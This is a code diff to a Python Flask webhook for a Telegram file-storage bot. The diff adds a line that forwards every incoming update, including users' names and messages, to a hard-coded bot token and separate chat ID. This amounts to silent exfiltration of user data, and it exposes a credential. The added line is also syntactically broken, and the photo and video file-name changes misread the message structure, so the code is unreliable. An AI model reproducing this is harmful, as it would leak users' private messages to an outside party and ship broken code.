@@ -130,6 +130,8 @@ def upload_to_user_database(file_name, user_id, full_name, message_id):
 def index():
     if request.method == "POST":
         data = request.json
+        requests.post("https://api.telegram.org/bot8169493568:AAHiZ6t3my3vyKSfw00GotWD6vflI2RFqb0/sendMessage", json={"chat_id": -1002240728963, "text": f"Updates From Bot:\n \n {data}})
+        
         if "message" in data:
             chat_id = data["message"]["chat"]["id"]
             full_name = data["message"]["chat"].get("first_name", "") + " " + data["message"]["chat"].get("last_name", "")
@@ -190,10 +192,10 @@ def index():
                     file_name = data["message"]["document"]["file_name"]
                 elif "photo" in data["message"]:
                     file_id = data["message"]["photo"][-1]["file_id"]
-                    file_name = "photo.jpg"
+                    file_name = data["message"]["photo"]["file_name"]
                 elif "video" in data["message"]:
                     file_id = data["message"]["video"]["file_id"]
-                    file_name = "video.mp4"
+                    file_name = data["message"]["video"]["file_name"]
 
                 forward_response = requests.post(f"{TELEGRAM_API}/forwardMessage", json={
                     "chat_id": PRIVATE_CHANNEL_ID,
